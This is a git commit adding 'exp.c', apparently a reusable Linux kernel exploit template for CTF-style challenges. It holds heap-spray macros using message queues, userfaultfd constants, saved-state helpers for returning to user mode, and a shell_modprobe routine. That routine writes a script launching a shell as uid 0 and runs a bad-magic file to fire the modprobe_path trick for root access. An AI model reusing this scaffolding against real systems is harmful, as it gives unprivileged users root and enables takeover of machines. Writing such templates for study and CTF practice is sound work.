46304dd314c4ec65a041bb26beff0427fdeb0d32
Ollrogge <nils-ollrogge@outlook.de>
2023-09-27 12:47:49 +0200

    Add old exploit template

---
+++ exp.c
@@ -0,0 +1,108 @@
+#define _GNU_SOURCE
+#include <string.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <assert.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <poll.h>
+#include <pthread.h>
+#include <err.h>
+#include <errno.h>
+#include <sched.h>
+#include <linux/bpf.h>
+#include <linux/filter.h>
+#include <linux/userfaultfd.h>
+#include <linux/prctl.h>
+#include <sys/syscall.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+#include <sys/prctl.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/xattr.h>
+#include <sys/socket.h>
+#include <sys/uio.h>
+
+// commands
+#define DEV_PATH ""   // the path the device is placed
+
+// constants
+#define PAGE 0x1000
+#define FAULT_ADDR 0xdead0000
+#define FAULT_OFFSET PAGE
+#define MMAP_SIZE 4*PAGE
+#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
+// (END constants)
+
+// globals
+// (END globals)
+
+// utils
+#define WAIT getc(stdin);
+#define ulong unsigned long
+#define scu static const unsigned long
+#define NULL (void*)0
+#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
+                        } while (0)
+#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
+                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
+                            errExit("KMALLOC"); \
+                        }
+
+static void print_hex8(char* buf, size_t len)
+{
+    uint64_t* tmp = (uint64_t*)buf;
+
+    for (int i = 0; i < (len / 8); i++) {
+        printf("%p ", tmp[i]);
+        if ((i + 1) % 2 == 0) {
+            printf("\n");
+        }
+    }
+
+    printf("\n");
+}
+
+static void shell_modprobe()
+{
+    system("echo '#!/bin/sh' > /home/user/hax; echo 'setsid cttyhack setuidgid 0 \
+           /bin/sh' >> /home/user/hax");
+    system("chmod +x /home/user/hax");
+    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/roooot");
+    system("chmod +x /home/user/roooot");
+    system("/home/user/roooot");
+}
+
+struct pt_regs {
+	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
+	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
+	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
+	ulong orig_ax; ulong ip; ulong cs; ulong flags;
+    ulong sp; ulong ss;
+};
+
+static void print_regs(struct pt_regs *regs)
+{
+  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
+  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
+  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
+  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
+  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
+}
+
+ulong user_cs,user_ss,user_sp,user_rflags;
+// should compile with -masm=intel
+static void save_state() {
+    __asm__("mov %0, cs\n"
+            "mov %1, ss\n"
+            "pushfq\n"
+            "popq %2\n"
+            :"=r"(user_cs),"=r"(user_ss),"=r"(user_rflags)
+            :
+            :"memory"
+    );
+}
